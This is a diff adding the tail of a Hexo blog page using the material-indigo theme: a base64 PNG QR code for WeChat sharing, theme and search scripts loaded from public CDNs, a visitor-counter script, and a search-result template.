+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3aQW7DMAwEwPz/0+61QBNjl3IKWB6dgsCRND4wFKnXKx7Hr3HV83+faVepBwYGxm0Zx+lIlkwW/jTD+WzJ3jAwMJ7D+LTw+TPnG5rFxmRdDAwMjHNGHijz0JyshYGBgdEG3E/fJL9Kkk4MDAyM2SE2SQfPF24PqF85i2NgYNyQkVfd///zV/obGBgYt2Ic5Wgblu1sx2hgYGDszcgD3PlG89B8jllpiGJgYOzKyENke+WiDdZ5ee6V1N4wMDC2Y7Rhrp0nfxGztigGBsbejKtaknn4nlXMiteKgYGxHWM9ULYXKdrrFNGrwcDA2JrRXg5rw/HK87PzKQYGxn6M9ipYvq185rZJ8GYeDAyMBzDyEv/K4bY+VccNUQwMjL0Z325etlc32vbqME3EwMC4FWOliDZL7PImZRKOMTAwnsBoC/pt2jc71g5fHwYGxqaM5HJDkleuNC9zatE9wMDAeAwjbzG218uS2Yo0EQMDY2tGexBty2SzhG+4BwwMjAcwVnoLK+njrPHwZp8YGBgPYFx7qet8njaIR3kgBgbGAxhtWX/WaKxLaW0/FgMDYzvGUY683NbOcFlSiIGBsR1jJRWblcbyA3PyucZgYGDclpEfNZOAOLs80Qbc+t8DAwNjC8a1zcg2BOf/AB9fCgYGBsaobbkSQOsVMTAwMIIlVxLBvCXwlYCLgYFxE0Z+JaIt3M9am3kQx8DAeAKjveiwEmqTTbTNTgwMjK0ZPyc6iYdO7pkaAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
